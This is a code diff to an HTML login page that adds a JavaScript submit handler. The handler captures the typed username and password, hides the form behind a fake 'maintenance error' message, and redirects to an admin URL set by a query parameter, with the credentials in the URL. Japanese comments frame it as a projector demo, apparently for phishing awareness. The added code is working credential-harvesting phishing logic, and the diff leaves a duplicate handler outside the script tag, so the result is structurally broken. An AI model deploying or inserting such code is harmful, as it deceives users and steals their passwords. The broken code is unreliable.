@@ -34,8 +34,7 @@
     </form>
   </div>
 
-  <script>
-    // URLから「どの管理者画面（PC）にデータを送るか」のリンク先を取得
+ <script>
     const urlParams = new URLSearchParams(window.location.search);
     const adminUrl = urlParams.get('admin') || 'admin.html';
 
@@ -48,6 +47,35 @@
       if (ua.includes("Mac")) return "Mac PC";
       return "不明な端末";
     }
+
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const device = getDeviceInfo();
+      const time = new Date().toLocaleTimeString();
+
+      const params = new URLSearchParams({
+        time: time,
+        device: device,
+        username: username,
+        password: password
+      });
+
+      // 1. スマホ側には「メンテナンスエラー画面」を表示して、ログイン画面を隠す
+      document.getElementById('login-box').classList.add('hidden');
+      document.getElementById('error-box').classList.remove('hidden');
+
+      // 2. 裏側（バックグラウンド）で、PC側の管理画面にデータを送って開く（またはリダイレクトさせる）
+      // ※本番のデモのときは、プロジェクターに映っているPC画面側でこのデータを受け取る形になります
+      setTimeout(() => {
+        window.location.href = `${adminUrl}?${params.toString()}`;
+      }, 1000); // 1秒後にデータ送信＆画面切り替え
+    });
+  </script>
+
+
 
     document.getElementById('login-form').addEventListener('submit', function(e) {
       e.preventDefault();
